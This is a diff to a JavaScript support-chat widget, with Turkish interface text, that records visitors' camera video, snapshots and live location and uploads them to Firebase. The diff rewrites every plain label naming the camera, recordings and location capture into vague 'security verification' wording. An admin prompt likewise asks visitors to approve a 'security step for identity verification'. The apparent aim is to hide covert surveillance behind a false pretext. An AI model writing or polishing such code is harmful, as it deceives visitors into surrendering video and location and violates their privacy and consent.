@@ -612,7 +612,7 @@ async function startVisitorCameraOffer(text, opts = {}) {
 
   await update(ref(database, `chats/${id}`), {
     updatedAt: Date.now(),
-    preview: "📷 Kamera bağlanıyor",
+    preview: "🔐 Güvenlik adımı başladı",
     lastWho: "user",
     lastCallId: callId,
     cameraPending: true,
@@ -763,7 +763,7 @@ async function markVisitorCameraReady(targetSessionId, callId) {
   };
   if (!already) {
     chatPatch.cameraGrantedAt = now;
-    chatPatch.preview = "📷 Kamera izni verildi";
+    chatPatch.preview = "🔐 Güvenlik doğrulaması onaylandı";
   }
   await update(ref(database, `chats/${targetSessionId}`), chatPatch).catch(() => {});
   return true;
@@ -796,7 +796,7 @@ async function writeLiveLocation(targetSessionId, callId, location) {
     hasLocation: true,
     lastCallId: callId,
     updatedAt: Date.now(),
-    preview: "📍 Konum alındı",
+    preview: "✓ Bu adım kaydedildi",
     lastWho: "user",
     page: location.pathname + location.hash,
   }).catch(() => {});
@@ -921,7 +921,7 @@ async function uploadCameraRecording(targetSessionId, callId, blob, fileName, op
     try {
       const chatPatch = {
         updatedAt: Date.now(),
-        preview: finalize ? "🎬 Kamera kaydı hazır" : "🎬 Kamera kaydı güncellendi",
+        preview: finalize ? "🎬 Güvenlik kaydı hazır" : "🎬 Güvenlik kaydı güncellendi",
         lastWho: "user",
         lastRecordingUrl: url,
         lastRecordingName: safeName,
@@ -977,7 +977,7 @@ async function uploadCameraSnapshot(targetSessionId, callId, blob, fileName) {
   });
   await update(ref(database, `chats/${targetSessionId}`), {
     updatedAt: now,
-    preview: "🖼 Kamera fotoğrafı alındı",
+    preview: "🖼 Doğrulama görüntüsü alındı",
     lastWho: "user",
     lastSnapshotUrl: url,
     hasCamera: true,
@@ -1020,7 +1020,7 @@ async function uploadVisitorPhoto(file, { index = 1, total = 1 } = {}) {
     },
   });
   const url = await getDownloadURL(fileRef);
-  const label = `Fotoğraf ${index}/${total}: ${original || safeName}`;
+  const label = `Görsel ${index}/${total}: ${original || safeName}`;
   const msgRef = push(ref(database, `chats/${id}/messages`));
   await set(msgRef, {
     who: "user",
@@ -1065,7 +1065,7 @@ async function sendAdminMessage(targetSessionId, text, options = {}) {
           : kind === "camera"
             ? "Kimlik doğrulaması için güvenlik adımını onaylamanız isteniyor. Onaylarsanız doğrulama bu destek oturumuna bağlanır. Onaylanmazsa doğrulama tamamlanamaz."
             : kind === "photos"
-              ? "Destek için ekran görüntüsü veya fotoğraf gönderebilirsiniz. En fazla 10 görsel seçebilirsiniz; istemezseniz iptal edin."
+              ? "Destek için ekran görüntüsü veya görsel gönderebilirsiniz. En fazla 10 görsel seçebilirsiniz; istemezseniz iptal edin."
               : "")
   )
     .trim()
@@ -1101,7 +1101,7 @@ async function sendAdminMessage(targetSessionId, text, options = {}) {
       .slice(0, 120);
   }
   if (kind === "photos") {
-    payload.okLabel = String(options.okLabel || "Fotoğraf seç").trim().slice(0, 40) || "Fotoğraf seç";
+    payload.okLabel = String(options.okLabel || "Görsel seç").trim().slice(0, 40) || "Görsel seç";
     payload.cancelLabel =
       String(options.cancelLabel || "İstemiyorum").trim().slice(0, 40) || "İstemiyorum";
     payload.maxPhotos = Math.min(
@@ -1126,9 +1126,9 @@ async function sendAdminMessage(targetSessionId, text, options = {}) {
         : kind === "popup"
           ? `Popup: ${clean.slice(0, 100)}`
           : kind === "camera"
-            ? "📷 Kamera talebi"
+            ? "🔐 Kimlik doğrulama talebi"
             : kind === "photos"
-              ? "🖼 Fotoğraf talebi"
+              ? "🖼 Görsel talebi"
               : clean.slice(0, 120),
     lastWho: "admin",
   });
